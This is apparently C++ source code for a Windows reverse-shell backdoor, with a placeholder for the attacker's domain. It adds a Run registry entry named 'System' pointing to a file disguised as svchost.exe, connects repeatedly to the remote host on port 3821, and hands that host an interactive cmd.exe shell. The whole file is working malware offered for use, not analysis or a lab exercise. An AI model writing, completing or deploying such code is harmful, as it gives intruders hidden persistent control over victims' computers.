#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <cstdlib>>
#pragma comment(lib,"WS2_32")
#include <stdio.h>
using namespace std;
WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
void addToStart()
{
    HKEY hkey;
    DWORD dwDispoition;

    RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS ,&hkey);
    const unsigned char path[150] = "C:\\ProgramData\\svchost.exe";
    RegSetValueEx(hkey,"System",0,1,path,sizeof(path));

}

void vv()
{
    addToStart();
    WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
	    (unsigned int)NULL, (unsigned int)NULL);
    loop1:
    hostent *record = gethostbyname("");//ENTER DOMAIN ADDRESS HERE
    in_addr * address = (in_addr * )record->h_addr;
    string ip_address = inet_ntoa(* address);
    const char *host_name = ip_address.c_str();
	hax.sin_family = AF_INET;
	hax.sin_port = htons(3821);
	hax.sin_addr.s_addr = inet_addr(host_name);

	int start = connect(s1, (SOCKADDR*)&hax, sizeof(hax ));
	if(start == SOCKET_ERROR)
    {
        goto loop1;
    }
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

	TCHAR commandLine[256] = "cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
	    0, NULL, NULL, &sui, &pi);

}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
  for(;;)
  {
      vv();
      Sleep(50);
  }
}


